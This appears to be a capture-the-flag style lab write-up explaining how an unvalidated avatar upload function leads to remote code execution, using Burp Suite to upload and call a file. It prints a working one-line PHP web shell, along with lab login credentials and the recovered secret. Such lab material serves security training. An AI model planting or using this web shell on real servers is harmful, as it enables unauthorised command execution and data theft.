01. Remote code execution via web shell upload </br>

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.
To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.You can log in to your own account using the following credentials: wiener:peter </br>

Proof Of Concept </br>

While proxying traffic through Burp, I logged **into** my account and **noticed** the option for uploading an avatar image. I activated the **"Images"** checkbox from the **Filter window** and **applied** the changes. In the proxy history, my image was fetched using a GET request to `/files/avatars/...`. I sent that request to **Repeater**. I created a file **named** `exploit.php` which **contained** the following command: `<?php system($_GET['cmd']); ?>`. Using the avatar upload function, I **uploaded** my PHP file **to** the server. The message in the response **confirmed** that it was uploaded successfully. I changed the path in Burp Repeater to `GET /files/avatars/exploit.php HTTP/1.1` and sent the request. The secret was **JiUx8pXbkgOxDKFYgmKhZ6yeQsgK3S12**. </br>
